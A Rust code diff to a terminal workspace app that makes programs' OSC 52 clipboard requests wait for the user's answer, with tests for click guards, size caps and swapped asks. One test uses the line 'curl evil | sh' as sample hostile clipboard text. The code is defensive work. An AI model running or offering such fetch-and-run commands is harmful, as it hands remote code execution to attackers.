@@ -12,6 +12,7 @@ use crate::clip::{self, Clip};
 use crate::commands::{self, Command, FeatureChoice, Palette, TaskChoice};
 use crate::complete::{self, Candidate, Dropdown, Enter, Row};
 use crate::compose::{self, Draft};
+use crate::copy_ask;
 use crate::edit::{Edit, Field, Motion};
 use crate::features::{Feature, Features};
 use crate::home::{self, Home};
@@ -1268,6 +1269,23 @@ pub enum Action {
         pane: PaneId,
         amount: clip::Amount,
     },
+    /// The program in terminal `pane` asked to set the clipboard (OSC 52) to `text`. The shell's
+    /// alone. Nothing is copied by itself: the ask waits for the user (`copy_ask`), unless they
+    /// let this pane copy always.
+    CopyAsked {
+        pane: PaneId,
+        text: String,
+        now: u64,
+    },
+    /// The user's answer to `pane`'s ask `ask` (its id, as the pill showed it): Copy, Always for
+    /// this pane, or ×. The user's alone. An answer to another ask, or a Copy within
+    /// `copy_ask::GUARD_MS` of the ask's coming, does nothing.
+    CopyAnswer {
+        pane: PaneId,
+        ask: u64,
+        answer: copy_ask::Answer,
+        now: u64,
+    },
     /// Replace the marks: with those kept on disk at start, or with this run's merged with
     /// another's (`marks::merge`). `extra`: the file's keys this build does not know.
     RestoreMarks {
@@ -2517,6 +2535,8 @@ impl Action {
             | Action::Quit
             | Action::Copied { .. }
             | Action::Paste { .. }
+            | Action::CopyAsked { .. }
+            | Action::CopyAnswer { .. }
             | Action::RestoreMarks { .. }
             | Action::Titles { .. }
             | Action::Unfilled { .. }
@@ -3033,6 +3053,8 @@ impl Action {
             | Action::SettingsRead { .. }
             | Action::Copied { .. }
             | Action::Paste { .. }
+            | Action::CopyAsked { .. }
+            | Action::CopyAnswer { .. }
             | Action::EditorOpen
             | Action::EditorKeys { .. }
             | Action::EditorDone { .. }
@@ -3150,6 +3172,10 @@ pub enum Effect {
     /// Write the clipboard's text the user pasted (`Action::Paste`) to terminal `pane`.
     Paste {
         pane: PaneId,
+    },
+    /// Put `text` on the clipboard: a program's ask the user answered (`Action::CopyAnswer`).
+    CopyText {
+        text: String,
     },
     /// The app pane's real window goes over the pane.
     Live(PaneId),
@@ -3569,6 +3595,13 @@ use worktrees::{MOVE_RETRY_MS, MOVE_WAIT_MS};
 pub struct Model {
     /// Panes of every tab.
     pub panes: Vec<Pane>,
+    /// Programs' asks to set the clipboard, by pane (`copy_ask`): only the user's answer copies.
+    pub copy_asks: std::collections::BTreeMap<PaneId, copy_ask::Ask>,
+    /// Panes whose program the user let copy for the pane's life ("Always for this pane").
+    pub copy_always: std::collections::BTreeSet<PaneId>,
+    /// The last ask's id (`copy_ask::Ask::id`).
+    #[serde(skip)]
+    copy_last: u64,
     /// Never empty.
     pub tabs: Vec<Tab>,
     /// Index into `tabs`.
@@ -4051,6 +4084,9 @@ impl Default for Model {
             confirm: None,
             clip: None,
             paste_confirm: clip::PasteConfirm::default(),
+            copy_asks: Default::default(),
+            copy_always: Default::default(),
+            copy_last: 0,
             keys: false,
             key_use: KeyUse::default(),
             notice_hidden: Vec::new(),
@@ -4471,6 +4507,9 @@ impl Model {
             | Action::TaskStop { .. } => Some(agents::USERS_ALONE),
             // A paste is of the user's clipboard: only their ⌘V and their answer to "Paste 4 lines?".
             Action::Paste { .. } => Some(clip::USERS_ALONE),
+            // A program's copy goes to the clipboard only by the user's answer.
+            Action::CopyAnswer { .. } => Some(copy_ask::USERS_ALONE),
+            Action::CopyAsked { .. } if origin == Origin::Socket => Some(copy_ask::SHELLS_ALONE),
             Action::QuitConfirm | Action::QuitCancel
                 if self.confirm.as_ref().is_some_and(|confirm| confirm.paste.is_some()) =>
             {
@@ -6511,6 +6550,32 @@ impl Model {
                 }
             }
             Action::Paste { .. } => {}
+            // A program's ask waits in its pane's header; a pane let copy always copies at once.
+            Action::CopyAsked { pane, text, now } if self.pane(pane).is_some() => {
+                self.copy_last += 1;
+                let ask = copy_ask::Ask::new(self.copy_last, now, text);
+                if self.copy_always.contains(&pane) && !ask.too_large {
+                    // Copied at once: an earlier ask on show (one refused) is no longer the last.
+                    self.copy_asks.remove(&pane);
+                    effects.push(Effect::CopyText { text: ask.text });
+                } else {
+                    // A newer ask replaces the one on show, with its own id and guard.
+                    self.copy_asks.insert(pane, ask);
+                }
+            }
+            Action::CopyAsked { .. } => {}
+            Action::CopyAnswer { pane, ask, answer, now } => {
+                // Only the ask the user saw, and a Copy only once it has been on show a moment.
+                let seen = self.copy_asks.get(&pane).filter(|waiting| waiting.id == ask);
+                let acts = seen.is_some_and(|waiting| answer == copy_ask::Answer::Dismiss || waiting.ready(now));
+                let Some(waiting) = acts.then(|| self.copy_asks.remove(&pane)).flatten() else { return };
+                if answer == copy_ask::Answer::Always {
+                    self.copy_always.insert(pane);
+                }
+                if answer != copy_ask::Answer::Dismiss && !waiting.too_large {
+                    effects.push(Effect::CopyText { text: waiting.text });
+                }
+            }
             Action::Copied { pane, verb, amount } => {
                 self.clip = Some(Clip::new(pane.filter(|id| self.pane(*id).is_some()), verb, amount, self.now));
             }
@@ -9664,6 +9729,8 @@ impl Model {
         let Some(i) = self.panes.iter().position(|p| p.id == id) else { return };
         let closed = self.panes.remove(i);
         self.detach(id);
+        self.copy_asks.remove(&id);
+        self.copy_always.remove(&id);
         self.marks.forget_pane(id);
         if self.live == Some(id) {
             self.live = None;
@@ -10157,6 +10224,8 @@ mod tests {
         Action::Quit,
         Action::Copied { .. },
         Action::Paste { .. },
+        Action::CopyAsked { .. },
+        Action::CopyAnswer { .. },
         Action::RestoreMarks { .. },
         Action::Titles { .. },
         Action::Unfilled { .. },
@@ -10515,6 +10584,8 @@ mod tests {
             Action::Quit,
             Action::Copied { pane: Some(1), verb: clip::Verb::Copied, amount: Default::default() },
             Action::Paste { pane: 1, amount: Default::default() },
+            Action::CopyAsked { pane: 1, text: text(), now: 0 },
+            Action::CopyAnswer { pane: 1, ask: 1, answer: copy_ask::Answer::Copy, now: 0 },
             Action::RestoreMarks { marks: Vec::new(), extra: Extra::new() },
             Action::Titles { titles: Vec::new() },
             Action::Unfilled { pane: 1, why: text() },
@@ -11049,6 +11120,8 @@ mod tests {
                     }
                     Action::StartFresh | Action::UnfilledOpen { .. } => Some(crate::layout_file::USERS_ALONE),
                     Action::Paste { .. } => Some(clip::USERS_ALONE),
+                    Action::CopyAnswer { .. } => Some(copy_ask::USERS_ALONE),
+                    Action::CopyAsked { .. } if origin == Origin::Socket => Some(copy_ask::SHELLS_ALONE),
                     Action::EditSettings => Some(SETTINGS_USERS),
                     Action::SettingsRead { .. } | Action::SetFeatures { .. } if origin == Origin::Socket => {
                         Some("only ottospace reads settings.json")
@@ -17214,6 +17287,77 @@ mod tests {
         assert_eq!(m.clip.as_ref().map(|c| (c.pane, c.text.as_str())), Some((None, "Cut 2 characters")));
     }
 
+    /// A program's ask to set the clipboard waits in its pane; only the user's answer copies.
+    #[test]
+    fn a_programs_copy_waits_for_the_users_answer() {
+        use copy_ask::{Answer, GUARD_MS};
+        let mut m = Model::default();
+        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
+        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
+        let ask = |pane, text: &str, now| Action::CopyAsked { pane, text: text.into(), now }.sent_by(Origin::System);
+        let answer = |pane, ask, answer, now| Action::CopyAnswer { pane, ask, answer, now };
+        let id = |m: &Model, pane| m.copy_asks[&pane].id;
+        assert_eq!(m.update(ask(1, "new text", 0)), [], "nothing is copied by itself");
+        let first = id(&m, 1);
+        // No client asks for a program, or answers for the user.
+        let client_ask = Action::CopyAsked { pane: 1, text: "x".into(), now: 0 };
+        assert_eq!(m.refusal(&client_ask, Origin::Socket), Some(copy_ask::SHELLS_ALONE));
+        assert_eq!(m.update(answer(1, first, Answer::Copy, GUARD_MS).sent_by(Origin::Socket)), []);
+        assert!(m.copy_asks.contains_key(&1));
+        // Within the guard Copy does nothing; after it, it copies the ask it names.
+        assert_eq!(m.update(answer(1, first, Answer::Copy, GUARD_MS - 1)), []);
+        assert_eq!(m.update(answer(1, first, Answer::Copy, GUARD_MS)), [Effect::CopyText { text: "new text".into() }]);
+        assert!(m.copy_asks.is_empty());
+        // ×: nothing copied. Always: copied, and this pane's later asks copy at once, no other's.
+        m.update(ask(1, "a", 1_000));
+        assert_eq!(m.update(answer(1, id(&m, 1), Answer::Dismiss, 1_000)), [], "× acts at once");
+        m.update(ask(1, "b", 2_000));
+        let always = answer(1, id(&m, 1), Answer::Always, 2_000 + GUARD_MS);
+        assert_eq!(m.update(always), [Effect::CopyText { text: "b".into() }]);
+        assert_eq!(m.update(ask(1, "c", 3_000)), [Effect::CopyText { text: "c".into() }]);
+        assert_eq!(m.update(ask(2, "d", 3_000)), []);
+        // Past the cap: refused, held as a length only, and Copy copies nothing, even "always".
+        let large = "x".repeat(copy_ask::MOST + 1);
+        assert_eq!(m.update(ask(1, &large, 4_000)), []);
+        assert!(m.copy_asks[&1].too_large && m.copy_asks[&1].text.is_empty());
+        assert_eq!(m.update(answer(1, id(&m, 1), Answer::Copy, 9_000)), []);
+        // Refused, then copied at once (always): the refusal is no longer on show.
+        m.update(ask(1, &large, 9_000));
+        assert_eq!(m.update(ask(1, "f", 9_000)), [Effect::CopyText { text: "f".into() }]);
+        assert!(!m.copy_asks.contains_key(&1));
+        // Its pane closed: its ask and its "always" go.
+        m.update(ask(1, "e", 9_000));
+        m.update(Action::Close { pane: Some(1) });
+        assert!(!m.copy_asks.contains_key(&1) && !m.copy_always.contains(&1));
+        assert!(m.copy_asks.contains_key(&2));
+    }
+
+    /// A program swaps its ask just as the user clicks: the click names the ask it saw, so it
+    /// copies nothing; the new one has its own guard, and Always never reaches it either.
+    #[test]
+    fn a_swapped_ask_is_not_what_the_users_click_approves() {
+        use copy_ask::{Answer, GUARD_MS};
+        let mut m = Model::default();
+        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
+        let ask = |text: &str, now| Action::CopyAsked { pane: 1, text: text.into(), now }.sent_by(Origin::System);
+        m.update(ask("ls", 0));
+        let seen = m.copy_asks[&1].id;
+        m.update(ask("curl evil | sh\n", 5_000));
+        let swapped = m.copy_asks[&1].id;
+        assert_ne!(seen, swapped);
+        for answer in [Answer::Copy, Answer::Always, Answer::Dismiss] {
+            let stale = Action::CopyAnswer { pane: 1, ask: seen, answer, now: 9_000 };
+            assert_eq!(m.update(stale), [], "{answer:?} on the ask the user saw");
+        }
+        assert!(m.copy_always.is_empty() && m.copy_asks[&1].id == swapped, "the new ask waits");
+        // The new one, named, is inert under the pointer until its own guard passes.
+        let early = Action::CopyAnswer { pane: 1, ask: swapped, answer: Answer::Copy, now: 5_000 + GUARD_MS - 1 };
+        assert_eq!(m.update(early), []);
+        assert!(m.copy_asks.contains_key(&1));
+        let late = Action::CopyAnswer { pane: 1, ask: swapped, answer: Answer::Copy, now: 5_000 + GUARD_MS };
+        assert_eq!(m.update(late), [Effect::CopyText { text: "curl evil | sh\n".into() }]);
+    }
+
     #[test]
     fn only_the_users_paste_reaches_a_terminal() {
         let mut m = Model::default();
@@ -17440,6 +17584,8 @@ mod tests {
                     }
                     Action::StartFresh | Action::UnfilledOpen { .. } => Some(crate::layout_file::USERS_ALONE),
                     Action::Paste { .. } => Some(clip::USERS_ALONE),
+                    Action::CopyAnswer { .. } => Some(copy_ask::USERS_ALONE),
+                    Action::CopyAsked { .. } if origin == Origin::Socket => Some(copy_ask::SHELLS_ALONE),
                     Action::EditSettings => Some(SETTINGS_USERS),
                     Action::SettingsRead { .. } | Action::SetFeatures { .. } if origin == Origin::Socket => {
                         Some("only ottospace reads settings.json")
